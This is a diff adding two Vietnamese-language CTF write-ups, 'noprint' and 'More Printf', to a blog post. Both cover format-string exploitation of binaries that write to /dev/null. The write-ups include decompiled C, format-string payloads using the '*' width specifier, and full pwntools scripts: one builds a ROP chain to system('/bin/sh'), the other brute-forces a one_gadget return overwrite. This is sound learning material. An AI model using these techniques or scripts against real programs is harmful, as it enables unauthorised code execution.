@@ -7,7 +7,6 @@ author: "kuvee"
 layout: post
 ---
 
-all file [here]
 
 ## noleek  (angstromCTF)
 
@@ -1090,3 +1089,344 @@ int __cdecl restricted_filter(const char *str)
 
 - vậy ta sẽ làm gì với điều này?
 
+....
+
+
+
+
+
+## noprint
+
+- bài rất ngắn , nói đơn giản là trước hết nó sẽ malloc và trả về 1 địa chỉ heap , sau đó ta sẽ nhập dữ liệu vào vùng heap này , cuối cùng là dùng `fprintf` để ghi dữ liệu vào /dev/null 
+
+```c
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  FILE *stream; // [rsp+20h] [rbp-10h]
+  char *buf; // [rsp+28h] [rbp-8h]
+
+  puts("Hello from the void");
+  init(argv, envp);
+  setbuf(_bss_start, 0);
+  setbuf(stdin, 0);
+  stream = fopen("/dev/null", "a");
+  for ( buf = (char *)malloc(0x100u); ; fprintf(stream, buf) )
+    buf[read(0, buf, 0x100u) - 1] = 0;
+}
+```
+
+- khó khăn thứ nhất của bài này là ta không thể đặt dữ liệu lên stack dễ dàng được , thứ hai là ta không thể leak bất cứ thứ gì vì nó đang ghi vào /dev/null  , vậy ta chỉ có thể write? ta phải làm như thế nào? 
+
+
+- có 2 cách để làm bài này : 
+
+    - cách 1 : ghi đè return address của `vfprintf_internal` -> dùng định dạng *
+    - cách 2 : thay đổi flags và fileno thành stdout -> có thể leak
+
+
+
+- ta sẽ bắt đầu với cách 1 trước: 
+
+offset của `rsp` ở bài này là 5 , và địa chỉ `0x55555555b6b0` sẽ chính là target của ta , ta sẽ cần thay đổi nó thành flags của stdout `0x00000000fbad2887` và `0x55555555b6b0+0x70` chính là fileno thành 1 
+
+![image](https://hackmd.io/_uploads/rJM_7cmJxx.png)
+
+- vì vậy ta sẽ cần kiếm các con trỏ trỏ đến nhau , và ở sau địa chỉ `libc_start_call_main` sẽ thích hợp để thực hiện việc này , ý tưởng của ta sẽ là sử dụng định dạng "*" để format string attack thay đổi giá trị tại offset đó thành `0x55555555b6b0+0x70` -> sau đó ta chỉ việc in ra 1 byte và ghi vào địa chỉ stack bên dưới , nó sẽ trông như sau: 
+
+```c
+s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
+s(b".%21$lln".ljust(0x100, b"\0"))
+```
+
+- lúc này ta thấy ta đã ghi thành công địa chỉ fileno , tiếp theo ta chỉ việc thay đổi flags -> `stdout` là được 
+
+![image](https://hackmd.io/_uploads/BJ67H9m1el.png)
+
+
+- lúc này ta đã hoàn tất việc thay đổi filestream thành stdout
+
+![image](https://hackmd.io/_uploads/SySPHcQklg.png)
+
+
+- cuối cùng chỉ cần thực hiện tương tự để build rop_chain , ở đây ta sẽ ghi rop_chain vào rip+8 trong fprintf , cuối cùng là thêm 1 ret để nó ret vào rop_chain 
+
+exp:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from subprocess import check_output
+from time import sleep
+
+from pwn import *
+
+context.terminal = [
+    "wt.exe",
+    "-w",
+    "0",
+    "split-pane",
+    "-d",
+    ".",
+    "wsl.exe",
+    "-d",
+    "kali-linux",
+    "--",
+    "bash",
+    "-c",
+]
+context.update(arch="amd64", os="linux")
+context.log_level = "debug"
+exe = context.binary = ELF("./noprint_patched", checksec=False)
+libc = exe.libc
+log_levels = ["info", "error", "warn", "debug"]
+info = lambda msg: log.info(msg)
+error = lambda msg: log.error(msg)
+warn = lambda msg: log.warn(msg)
+debug = lambda msg: log.debug(msg)
+
+
+def one_gadget(filename, base_addr=0):
+    return [
+        (int(i) + base_addr)
+        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
+        .decode()
+        .split(" ")
+    ]
+
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: (
+    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: (
+    proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+)
+sn = lambda num, proc=None: (
+    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+)
+sna = lambda msg, num, proc=None: (
+    proc.sendafter(msg, str(num).encode())
+    if proc
+    else p.sendafter(msg, str(num).encode())
+)
+sln = lambda num, proc=None: (
+    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+)
+slna = lambda msg, num, proc=None: (
+    proc.sendlineafter(msg, str(num).encode())
+    if proc
+    else p.sendlineafter(msg, str(num).encode())
+)
+
+
+def logbase():
+    log.info("libc base = %#x" % libc.address)
+
+
+def rcu(d1, d2=0):
+    p.recvuntil(d1, drop=True)
+    # return data between d1 and d2
+    if d2:
+        return p.recvuntil(d2, drop=True)
+
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(1)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(
+            int(pid),
+            gdbscript=gdbscript
+            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
+            exe=exe.path,
+        )
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+gdbscript = """
+brva 0x0000000000001381
+brva 0x00000000000013A7
+c
+"""
+
+p = start()
+
+# ==================== EXPLOIT ====================
+
+
+def exploit():
+    p.recvline()
+    input()
+    s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
+    s(b".%21$lln".ljust(0x100, b"\0"))
+    s(f"%{0x2887}c%9$hn".encode().ljust(0x100, b"\0"))
+
+    p.send(b"%11$p %12$p %16$p %50c".ljust(0x100, b"\x00"))
+    p.recvuntil(b"0x")
+    stack = int(p.recvuntil(b" "), 16) - 0xD8
+    libc.address = int(p.recvuntil(b" "), 16) - 0x2A3B8
+    exe.address = int(p.recvuntil(b" "), 16) - 0x12E4
+    info(f"stack= {hex(stack)} libc: {hex(libc.address)} exe: {hex(exe.address)}")
+    pop_rdi = libc.address + 0x00000000000CEE4D
+    bin_sh = next(libc.search(b"/bin/sh\x00"))
+    system = libc.sym.system
+    info(f"bin_sh: {hex(bin_sh)}")
+    info(f"system: {hex(system)}")
+    info(f"pop: {hex(pop_rdi)}")
+
+    ret = exe.address + 0x12E3
+
+    def write_v(target, val):
+        p.send(f"%{target&0xffff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{val&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(target+2)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(val>>16)&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(target+4)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(val>>32)&0xffff}c%31$n".encode().ljust(0x100, b"\0"))
+
+    sleep(0.5)
+    p.send(f"%{stack&0xffff}c%11$hn".encode().ljust(0x100, b"\0"))
+    sleep(0.5)
+    write_v(stack + 8, pop_rdi)
+    sleep(0.5)
+    write_v(stack + 16, bin_sh)
+    sleep(0.5)
+    write_v(stack + 24, system)
+    sleep(0.5)
+    p.send(f"%{stack&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+    sleep(0.5)
+    p.send(f"%{ret&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exploit()
+
+```
+
+cách 2 ta có thể xem ở đây: https://robbert1978.github.io/2025/03/02/2025-3-3-PwnMe-Quals-2025/
+
+
+
+
+More Printf
+-----
+
+tóm tắt bài này là fmt tuy nhiên chỉ có 1 lần và không thể ghi đè main rồi leak các kiểu , nên chỉ được fmt 1 lần và lấy shell luôn , sử dụng * để ghi thằng này qua thàng khác , cần bruteforce và chưa làm ra :)))
+
+còn thắc mắc nữa là tại sao offset nó là 5 ? 
+
+https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/
+
+https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/
+
+
+
+
+
+- chương trình có vẻ rất đơn giản , đầu tiên ta thấy nó sẽ mở `/dev/null` và có 1 `fsb` 
+```c
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  v3[1] = __readfsqword(0x28u);
+  v3[0] = (__int64)v3;
+  setbuf(stdin, 0LL);
+  buffer = (char *)malloc(0x21uLL);
+  fp = fopen("/dev/null", "wb");
+  fgets(buffer, 31, stdin);
+  if ( i != 0x8D9E7E558877LL )
+    _exit(1337);
+  i = 1337LL;
+  fprintf(fp, buffer);
+  _exit(1);
+}
+```
+- ở đây nó check biến i , có nghĩa là ta không thể quay lại main , ta cần 1 lần one_shot để giải quyết vấn đề 
+
+- ta sẽ có 30 byte để giải quyết vấn đề này 
+
+- khi đi sâu vào `fprintf` , ta sẽ thấy nó gọi `vprintf`
+
+![image](https://hackmd.io/_uploads/HkTsug6TJe.png)
+
+- ta sẽ thử leak 1 số thứ để tìm offset , dùng `set $rdi = _IO_stdout` để có thể leak và offset sẽ bắt đầu từ đây
+
+![image](https://hackmd.io/_uploads/Hyf2Fepakl.png)
+
+
+- vậy ý tưởng sẽ là gì?  ta sẽ dùng định dạng `*`  , ta sẽ dùng cái này để lấy offset trên stack của 1 địa chỉ libc và ghi nó vào `ret-address` -> thành 1 one_gadget thõa mãn và cách này sẽ không cần leak libc  , nếu ta dùng %*$8c thì nó tương tự như in tất cả byte của libc_start_main ra
+
+- ta thấy trên stack có 1 địa chỉ stack trỏ đến chính nó , ta sẽ dùng `fsb` để ghi thằng này thành `0x7ffe440f0b28` là địa chỉ đang chứa stack , và sử dụng 1 số `magic` tính toán để ghi vào và thay đổi `0x7f17eaaf9151 (read+17)` thành `one_gadget`  
+
+![image](https://hackmd.io/_uploads/BkdYTlTTyg.png)
+
+`%c%c%c%5c%hhn%*8$d` cái này sẽ in ra 8 byte và ghi vào offset thứ 5 , sau đó in số lượng của `libc_start_main`
+
+- ta sẽ chọn `og` thứ hai `0x4f3d5` 
+
+![image](https://hackmd.io/_uploads/SJb-yZaTyx.png)
+
+- lúc này địa chỉ base của libc là `0x7f7935d5a000` , và địa chỉ libc_start_main là `0x7f7935d7bbf7` , địa chỉ cần ghi sẽ là `0x7f7935d5a000` + `0x4f3d5` = `0x7f7935da93d5`  , vậy số byte cần ghi là 
+
+![image](https://hackmd.io/_uploads/Hkzgl-66yl.png)
+
+- trừ 8 vì trước đó đã in ra 8 byte
+
+- ta có thể thấy được bây giờ nó đã ghi thành công , nhưng nó chưa ghi đúng vào vị trí ta cần , vì vậy sẽ cần 1 tí brute-force
+
+![image](https://hackmd.io/_uploads/ryD4bb661l.png)
+
+- như ta thấy bây giờ nó đã ghi thành công , tại `0x7fffe0a37908` chứa địa chỉ `og` của ta 
+
+![image](https://hackmd.io/_uploads/ryICM-pTJx.png)
+
+
+script
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./more-printf_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+#gdb.attach(p,gdbscript='''
+#           b*main+193
+#            b*fprintf+143
+#            c
+#           ''')
+
+num_of_tries = 0
+while True:
+    try:
+        sleep(0.5)
+        p = process()
+        num_of_tries += 1
+
+        p.sendline('%c%c%c%5c%hhn%*8$d%186326c%5$n')
+        p.sendline('id')
+        p.unrecv(p.recvn(1, timeout=3))
+
+        print(f"Got shell after {num_of_tries} tries")
+        break
+    except EOFError:
+        pass
+p.interactive()
+```
